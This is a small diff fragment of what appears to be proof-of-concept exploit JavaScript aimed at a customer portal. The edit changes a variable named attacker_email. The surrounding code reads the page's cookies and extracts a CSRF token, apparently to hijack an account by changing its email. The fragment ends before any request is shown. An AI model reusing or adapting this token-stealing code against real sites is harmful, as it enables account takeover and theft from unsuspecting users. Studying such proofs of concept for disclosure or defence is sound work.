@@ -4,7 +4,7 @@ console.log(origin)
 //window.top.location.href="/xxxxxxxxxxxx"
 
 
-attacker_email = "lchua+customerportal@hubspot.com"
+attacker_email = "la_chua15@live.com"
 cookies=document.cookie
 x = cookies.indexOf("csrf.app=")+9
 y = cookies.substring(x).indexOf(";")
